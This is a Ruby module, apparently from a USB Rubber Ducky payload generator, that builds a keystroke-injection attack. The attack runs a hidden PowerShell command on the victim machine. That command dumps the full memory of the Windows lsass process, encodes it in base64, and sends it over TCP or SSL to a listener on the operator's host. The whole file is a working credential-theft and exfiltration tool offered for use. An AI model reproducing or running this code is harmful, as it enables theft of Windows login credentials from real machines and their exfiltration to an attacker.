#!/usr/bin/env ruby
## Thanks to:
# @mattifestation
require 'skeleton'
class LsassDump < Skeleton
  attr_reader :ducky
  self.title = 'Lsass Dump TCP'
  self.description = 'Dump lsass process memory, and send it over TCP'

  def setup
    @host = @server_setup.host
    @port = @server_setup.port
    @ssl = @server_setup.use_ssl?
  end

  def run
    return unless @server_setup.host_listener?
    server = Server::Start.new(@ssl, @host, @port)
    Thread.new { server.listener('lsass') }
  end

  def finish
    priv_choice = @ducky_writer.menu
    File.open("#{text_path}#{@file_name}.txt", 'w') do |f|
      f.write(@ducky_writer.write(priv_choice))
      f.write(psh_command(@host, @port, @ssl))
    end
    Ducky::Compile.new("#{@file_name}.txt")
  end

  def path(folder)
    "c:\\windows\\temp\\#{folder}"
  end

  def psh_command(host, port, ssl)
    proc_dump = 'powershell -nop -wind hidden -noni '
    proc_dump << %($path='#{path(random_name_gen)}.dmp';)
    proc_dump << "if([IntPtr]::Size -eq 4){$arch='_32_'}else{$arch='_64_'};"
    proc_dump << "$comp_name=(gc env:computername)+$arch+'lsass.dmp';"
    proc_dump << '$proc = ps lsass;$proc_handle = $proc.Handle;$proc_id = '
    proc_dump << '$proc.Id;$WER = [PSObject].Assembly.GetType'
    proc_dump << "('System.Management.Automation.WindowsErrorReporting');"
    proc_dump << "$WERNativeMethods = $WER.GetNestedType('NativeMethods', "
    proc_dump << "'NonPublic');$Flags = [Reflection.BindingFlags] "
    proc_dump << "'NonPublic, Static';$MiniDumpWriteDump = "
    proc_dump << "$WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags);"
    proc_dump << '$MiniDumpWithFullMemory = [UInt32] 2;$FileStream = '
    proc_dump << 'New-Object IO.FileStream($path, [IO.FileMode]::Create);'
    proc_dump << '$Result = $MiniDumpWriteDump.Invoke($null,@($proc_handle,'
    proc_dump << '$proc_id,$FileStream.SafeFileHandle,$MiniDumpWithFullMemory,'
    proc_dump << '[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));'
    proc_dump << '$FileStream.Close();$lsass_file=[System.Convert]::'
    proc_dump << 'ToBase64String([io.file]::ReadAllBytes($path));'
    proc_dump << "$socket = New-Object Net.Sockets.TcpClient('#{host}', "
    proc_dump << "#{port.to_i});$stream = $socket.GetStream();"
    if ssl
      proc_dump << '$sslStream = New-Object System.Net.Security.SslStream'
      proc_dump << '($stream,$false,({$True} -as [Net.Security.'
      proc_dump << 'RemoteCertificateValidationCallback]));'
      proc_dump << "$sslStream.AuthenticateAsClient('#{host}');$writer = "
      proc_dump << 'new-object System.IO.StreamWriter($sslStream);'
      proc_dump << '$writer.WriteLine($comp_name);$writer.flush();$writer.'
      proc_dump << 'WriteLine($lsass_file);$writer.flush();$socket.close()'
    else
      proc_dump << '$writer = new-object System.IO.StreamWriter($stream);'
      proc_dump << '$writer.WriteLine($comp_name);$writer.flush();'
      proc_dump << '$writer.WriteLine($lsass_file);$writer.flush();$socket.close()'
    end
    proc_dump
  end
end
